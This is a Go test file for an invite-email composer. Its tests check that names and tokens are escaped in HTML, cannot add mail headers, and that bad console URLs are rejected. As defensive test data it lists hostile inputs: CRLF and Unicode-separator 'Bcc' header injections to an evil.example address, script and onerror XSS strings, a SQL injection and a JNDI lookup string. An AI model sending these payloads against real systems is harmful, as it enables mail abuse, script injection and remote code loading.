package invitemail

import (
	"bytes"
	"io"
	"mime"
	"mime/multipart"
	"net/mail"
	"strings"
	"testing"
	"time"

	pmail "helios/backend/internal/platform/mail"
)

var hostileNames = []string{
	"Evil\r\nBcc: attacker@evil.example",
	"</title><script>alert(1)</script>",
	`"><img src=x onerror=alert(1)>`,
	"Acme & Sons <admin@acme.example>",
	"Name\u2028Bcc: x@evil.example",
	"' OR 1=1 --",
	"{{.Token}} ${jndi:ldap://evil.example/a}",
	"javascript:alert(1)",
	strings.Repeat("W", 500),
}

func payload(ws, who string) Payload {
	return Payload{To: "bob@example.com", Token: "hinv_TESTTOKEN123", WorkspaceName: ws, InviterName: who, Role: "editor", ExpiresAt: time.Now().Add(7 * 24 * time.Hour).UTC().Format(time.RFC3339)}
}

func TestComposeEscapesEveryUserSuppliedFieldInTheHTML(t *testing.T) {
	for _, h := range hostileNames {
		msg, err := Compose(payload(h, h), "https://console.example.test")
		if err != nil {
			t.Fatal(err)
		}
		for _, dangerous := range []string{"<script", "<img", "</title>", "<admin@", "\" onerror"} {
			if strings.Contains(strings.ToLower(msg.HTML), dangerous) {
				t.Errorf("name %q: the HTML contains %q:\n%s", h, dangerous, msg.HTML)
			}
		}
		// the only anchors are the one we make
		if n := strings.Count(msg.HTML, "<a "); n != 1 {
			t.Errorf("name %q: %d anchors", h, n)
		}
	}
}

func TestComposeHostileNamesCannotAddHeadersEvenAfterBuilding(t *testing.T) {
	for _, h := range hostileNames {
		msg, err := Compose(payload(h, h), "https://console.example.test")
		if err != nil {
			t.Fatal(err)
		}
		raw, err := pmail.Build("noreply@helios.example", msg, time.Now(), "helios.example")
		if err != nil {
			t.Fatalf("%q: %v", h, err)
		}
		m, err := mail.ReadMessage(bytes.NewReader(raw))
		if err != nil {
			t.Fatal(err)
		}
		for k := range m.Header {
			switch k {
			case "From", "To", "Subject", "Date", "Message-Id", "Mime-Version", "Content-Type", "Auto-Submitted":
			default:
				t.Errorf("name %q: header %q appeared", h, k)
			}
		}
		if got := m.Header.Get("To"); got != "bob@example.com" {
			t.Errorf("name %q: To = %q", h, got)
		}
		dec := new(mime.WordDecoder)
		subj, _ := dec.DecodeHeader(m.Header.Get("Subject"))
		if strings.ContainsAny(subj, "\r\n") || !strings.HasPrefix(subj, "You're invited to join ") {
			t.Errorf("name %q: subject %q", h, subj)
		}
		// the text part carries the names as plain text, once each
		_, params, _ := mime.ParseMediaType(m.Header.Get("Content-Type"))
		mr := multipart.NewReader(m.Body, params["boundary"])
		p, _ := mr.NextPart()
		text, _ := io.ReadAll(p)
		if !strings.Contains(string(text), "https://console.example.test/invite/hinv_TESTTOKEN123") {
			t.Errorf("name %q: no invite link in the text part", h)
		}
	}
}

func TestComposeContentAndLink(t *testing.T) {
	msg, err := Compose(payload("Acme", "alice@example.com"), "https://console.example.test/")
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"alice@example.com invited you", `"Acme"`, "an editor", "https://console.example.test/invite/hinv_TESTTOKEN123", "expires on"} {
		if !strings.Contains(msg.Text, want) {
			t.Errorf("text lacks %q:\n%s", want, msg.Text)
		}
	}
	if !strings.Contains(msg.HTML, `href="https://console.example.test/invite/hinv_TESTTOKEN123"`) {
		t.Errorf("html: %s", msg.HTML)
	}
	// a token with characters that need escaping in a path cannot break out of the link
	p := payload("Acme", "a")
	p.Token = `x"/><b>`
	m2, _ := Compose(p, "https://console.example.test")
	if strings.Contains(m2.HTML, "<b>") || strings.Contains(m2.Text, "<b>") {
		t.Errorf("token not escaped: %s", m2.HTML)
	}
	// an unusable console address is an error, not a broken link
	for _, bad := range []string{"", "console", "javascript:alert(1)", "ftp://x.example"} {
		if _, err := Compose(payload("Acme", "a"), bad); err == nil {
			t.Errorf("console URL %q accepted", bad)
		}
	}
}

func TestHashTokenMatchesTheInvitesTable(t *testing.T) {
	// sha256("abc") in hex
	if got := HashToken("abc"); got != "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad" {
		t.Errorf("%s", got)
	}
}
